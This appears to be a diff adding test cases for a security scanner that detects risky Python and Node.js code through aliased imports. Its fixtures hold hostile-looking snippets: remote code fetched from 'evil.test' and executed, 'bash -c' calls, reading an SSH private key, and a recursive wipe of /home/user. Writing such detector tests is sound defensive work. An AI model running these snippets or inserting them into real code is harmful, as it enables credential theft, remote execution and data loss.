@@ -50,6 +50,23 @@ describe("Python scanning", () => {
     const result = scanPython(`print("exec(requests.get('https://evil.test').text)")`);
     expect(result.findings).toHaveLength(0);
   });
+
+  it("resolves Python module and imported-function aliases", () => {
+    const network = scanPython("import requests as r\nr.get('https://example.test/data')");
+    expect(network.findings.some((finding) => finding.category === "network_egress")).toBe(true);
+
+    const process = scanPython(
+      "from subprocess import run as launch\nlaunch(['bash', '-c', payload])",
+    );
+    expect(process.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);
+  });
+
+  it("detects sensitive pathlib call chains", () => {
+    const result = scanPython(
+      "from pathlib import Path\n(Path.home() / '.ssh' / 'id_rsa').read_text()",
+    );
+    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(true);
+  });
 });
 
 describe("Node.js scanning", () => {
@@ -96,6 +113,18 @@ describe("Node.js scanning", () => {
       .findings.some((finding) => finding.category === "download_execution")).toBe(false);
     expect(scanJavaScript("eval(await (await fetch('https://artifacts.corp.example/a')).text())", options)
       .findings.some((finding) => finding.category === "download_execution")).toBe(false);
+  });
+
+  it("resolves CommonJS destructuring and ESM aliases", () => {
+    const commonJs = scanJavaScript(
+      "const { exec: runCommand } = require('node:child_process'); runCommand('bash -c id')",
+    );
+    expect(commonJs.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);
+
+    const esm = scanJavaScript(
+      "import { rmSync as wipe } from 'node:fs'; wipe('/home/user', { recursive: true })",
+    );
+    expect(esm.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
   });
 });
 
